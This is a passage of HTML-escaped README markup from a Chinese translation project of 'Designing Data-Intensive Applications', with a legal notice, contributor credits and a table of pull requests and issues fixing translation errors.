href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/colophon.md&#34;&gt;后记&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;h2&gt;法律声明&lt;/h2&gt; &#xA;&lt;p&gt;从原作者处得知，已经有简体中文的翻译计划，将于 2018 年末完成。&lt;a href=&#34;https://search.jd.com/Search?keyword=%E8%AE%BE%E8%AE%A1%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8&#34;&gt;购买地址&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;译者纯粹出于 &lt;strong&gt;学习目的&lt;/strong&gt; 与 &lt;strong&gt;个人兴趣&lt;/strong&gt; 翻译本书，不追求任何经济利益。&lt;/p&gt; &#xA;&lt;p&gt;译者保留对此版本译文的署名权，其他权利以原作者和出版社的主张为准。&lt;/p&gt; &#xA;&lt;p&gt;本译文只供学习研究参考之用，不得公开传播发行或用于商业用途。有能力阅读英文书籍者请购买正版支持。&lt;/p&gt; &#xA;&lt;h2&gt;贡献&lt;/h2&gt; &#xA;&lt;ol start=&#34;0&#34;&gt; &#xA; &lt;li&gt;全文校订 by &lt;a href=&#34;https://github.com/Vonng/ddia/commits?author=yingang&#34;&gt;@yingang&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/commit/afb5edab55c62ed23474149f229677e3b42dfc2c&#34;&gt;序言初翻修正&lt;/a&gt; by &lt;a href=&#34;https://github.com/Vonng/ddia/commits?author=seagullbird&#34;&gt;@seagullbird&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/commit/973b12cd8f8fcdf4852f1eb1649ddd9d187e3644&#34;&gt;第一章语法标点校正&lt;/a&gt; by &lt;a href=&#34;https://github.com/Vonng/ddia/commits?author=nevertiree&#34;&gt;@nevertiree&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/commit/d4eb0852c0ec1e93c8aacc496c80b915bb1e6d48&#34;&gt;第六章部分校正&lt;/a&gt; 与&lt;a href=&#34;https://github.com/Vonng/ddia/commit/9de8dbd1bfe6fbb03b3bf6c1a1aa2291aed2490e&#34;&gt;第十章的初翻&lt;/a&gt; by &lt;a href=&#34;https://github.com/Vonng/ddia/commits?author=MuAlex&#34;&gt;@MuAlex&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/part-i.md&#34;&gt;第一部分&lt;/a&gt;前言，&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/ch2.md&#34;&gt;ch2&lt;/a&gt;校正 by &lt;a href=&#34;https://github.com/Vonng/ddia/commits?author=jiajiadebug&#34;&gt;@jiajiadebug&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/glossary.md&#34;&gt;词汇表&lt;/a&gt;、&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/colophon.md&#34;&gt;后记&lt;/a&gt;关于野猪的部分 by &lt;a href=&#34;https://github.com/Vonng/ddia/commits?author=Chowss&#34;&gt;@Chowss&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pulls&#34;&gt;繁體中文&lt;/a&gt;版本与转换脚本 by &lt;a href=&#34;https://github.com/afunTW&#34;&gt;@afunTW&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;多处翻译修正 by &lt;a href=&#34;https://github.com/Vonng/ddia/commits?author=songzhibin97&#34;&gt;@songzhibin97&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;感谢所有作出贡献，提出意见的朋友们：&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pulls&#34;&gt;Pull Requests&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://github.com/Vonng/ddia/issues&#34;&gt;Issues&lt;/a&gt;&lt;/summary&gt; &#xA; &lt;table&gt; &#xA;  &lt;thead&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;th&gt;ISSUE &amp;amp; Pull Requests&lt;/th&gt; &#xA;    &lt;th&gt;USER&lt;/th&gt; &#xA;    &lt;th&gt;Title&lt;/th&gt; &#xA;   &lt;/tr&gt; &#xA;  &lt;/thead&gt; &#xA;  &lt;tbody&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/237&#34;&gt;237&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/zhangnew&#34;&gt;@zhangnew&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch3: 修正错误的图片链接&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/229&#34;&gt;229&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/lis186&#34;&gt;@lis186&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;指出繁体中文的转译错误：复杂&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/226&#34;&gt;226&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/chroming&#34;&gt;@chroming&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch1: 修正导航栏中的章节名称&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/220&#34;&gt;220&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/skyran1278&#34;&gt;@skyran1278&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch9: 修正线性一致的繁体中文翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/194&#34;&gt;194&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/BeBraveBeCurious&#34;&gt;@BeBraveBeCurious&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch4: 修正错误的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/193&#34;&gt;193&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/BeBraveBeCurious&#34;&gt;@BeBraveBeCurious&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch4: 优化译文&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/192&#34;&gt;192&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/BeBraveBeCurious&#34;&gt;@BeBraveBeCurious&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch4: 修正不一致和不通顺的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/190&#34;&gt;190&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Pcrab&#34;&gt;@Pcrab&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch1: 修正不准确的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/187&#34;&gt;187&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/narojay&#34;&gt;@narojay&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch9: 修正生硬的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/186&#34;&gt;186&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/narojay&#34;&gt;@narojay&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch8: 修正错别字&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/issues/185&#34;&gt;185&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/8da2k&#34;&gt;@8da2k&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;指出小标题跳转的问题&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/184&#34;&gt;184&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/DavidZhiXing&#34;&gt;@DavidZhiXing&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch10: 修正失效的网址&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/183&#34;&gt;183&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/OneSizeFitsQuorum&#34;&gt;@OneSizeFitsQuorum&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch8: 修正错别字&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/issues/182&#34;&gt;182&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/lroolle&#34;&gt;@lroolle&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;建议docsify的主题风格&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/181&#34;&gt;181&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/YunfengGao&#34;&gt;@YunfengGao&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch2: 修正翻译错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/180&#34;&gt;180&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/skyran1278&#34;&gt;@skyran1278&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch3: 指出繁体中文的转译错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/177&#34;&gt;177&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/exzhawk&#34;&gt;@exzhawk&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;支持 Github Pages 里的公式显示&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/176&#34;&gt;176&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/haifeiWu&#34;&gt;@haifeiWu&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch2: 语义网相关翻译更正&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/175&#34;&gt;175&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/cwr31&#34;&gt;@cwr31&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch7: 不变式相关翻译更正&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/174&#34;&gt;174&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/BeBraveBeCurious&#34;&gt;@BeBraveBeCurious&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;README &amp;amp; preface: 更正不正确的中文用词和标点符号&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/173&#34;&gt;173&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ZvanYang&#34;&gt;@ZvanYang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch12: 修正不完整的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/171&#34;&gt;171&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ZvanYang&#34;&gt;@ZvanYang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch12: 修正重复的译文&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/169&#34;&gt;169&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ZvanYang&#34;&gt;@ZvanYang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch12: 更正不太通顺的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/166&#34;&gt;166&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/bp4m4h94&#34;&gt;@bp4m4h94&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch1: 发现错误的文献索引&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/164&#34;&gt;164&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/DragonDriver&#34;&gt;@DragonDriver&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;preface: 更正错误的标点符号&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/163&#34;&gt;163&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/llmmddCoder&#34;&gt;@llmmddCoder&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch1: 更正错误字&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/160&#34;&gt;160&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Zhayhp&#34;&gt;@Zhayhp&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch2: 建议将 network model 翻译为网状模型&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/159&#34;&gt;159&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/1ess&#34;&gt;@1ess&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch4: 更正错误字&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/157&#34;&gt;157&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ZvanYang&#34;&gt;@ZvanYang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch7: 更正不太通顺的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/155&#34;&gt;155&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ZvanYang&#34;&gt;@ZvanYang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch7: 更正不太通顺的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/153&#34;&gt;153&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/DavidZhiXing&#34;&gt;@DavidZhiXing&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch9: 修正缩略图的错别字&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/152&#34;&gt;152&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ZvanYang&#34;&gt;@ZvanYang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch7: 除重-&amp;gt;去重&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/151&#34;&gt;151&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ZvanYang&#34;&gt;@ZvanYang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch5: 修订sibling相关的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/147&#34;&gt;147&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ZvanYang&#34;&gt;@ZvanYang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch5: 更正一处不准确的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/145&#34;&gt;145&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Hookey&#34;&gt;@Hookey&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;识别了当前简繁转译过程中处理不当的地方，暂通过转换脚本规避&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/issues/144&#34;&gt;144&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/secret4233&#34;&gt;@secret4233&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch7: 不翻译&lt;code&gt;next-key locking&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/issues/143&#34;&gt;143&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/imcheney&#34;&gt;@imcheney&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch3: 更新残留的机翻段落&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/issues/142&#34;&gt;142&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/XIJINIAN&#34;&gt;@XIJINIAN&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;建议去除段首的制表符&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/issues/141&#34;&gt;141&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Flyraty&#34;&gt;@Flyraty&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch5: 发现一处错误格式的章节引用&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/140&#34;&gt;140&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Bowser1704&#34;&gt;@Bowser1704&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch5: 修正章节Summary中多处不通顺的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/139&#34;&gt;139&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Bowser1704&#34;&gt;@Bowser1704&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch2&amp;amp;ch3: 修正多处不通顺的或错误的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/137&#34;&gt;137&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/fuxuemingzhu&#34;&gt;@fuxuemingzhu&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch5&amp;amp;ch6: 优化多处不通顺的或错误的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/134&#34;&gt;134&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/fuxuemingzhu&#34;&gt;@fuxuemingzhu&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch4: 优化多处不通顺的或错误的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/133&#34;&gt;133&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/fuxuemingzhu&#34;&gt;@fuxuemingzhu&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch3: 优化多处错误的或不通顺的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/132&#34;&gt;132&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/fuxuemingzhu&#34;&gt;@fuxuemingzhu&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch3: 优化一处容易产生歧义的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/131&#34;&gt;131&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/rwwg4&#34;&gt;@rwwg4&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch6: 修正两处错误的翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/129&#34;&gt;129&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/anaer&#34;&gt;@anaer&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch4: 修正两处强调文本和四处代码变量名称&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/128&#34;&gt;128&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/meilin96&#34;&gt;@meilin96&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch5: 修正一处错误的引用&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/126&#34;&gt;126&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/cwr31&#34;&gt;@cwr31&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch10: 修正一处错误的翻译（功能 -&amp;gt; 函数）&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/125&#34;&gt;125&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/dch1228&#34;&gt;@dch1228&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch2: 优化 how best 的翻译（如何以最佳方式）&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/124&#34;&gt;124&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/yingang&#34;&gt;@yingang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;translation updates (chapter 10)&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/123&#34;&gt;123&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/yingang&#34;&gt;@yingang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;translation updates (chapter 9, TOC in readme, glossary, etc.)&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/121&#34;&gt;121&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/yingang&#34;&gt;@yingang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;translation updates (chapter 5 to chapter 8)&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/120&#34;&gt;120&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/jiong-han&#34;&gt;@jiong-han&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Typo fix: 呲之以鼻 -&amp;gt; 嗤之以鼻&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/119&#34;&gt;119&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/cclauss&#34;&gt;@cclauss&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Streamline file operations in convert()&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/118&#34;&gt;118&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/yingang&#34;&gt;@yingang&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;translation updates (chapter 2 to chapter 4)&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/117&#34;&gt;117&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/feeeei&#34;&gt;@feeeei&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;统一每章的标题格式&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a 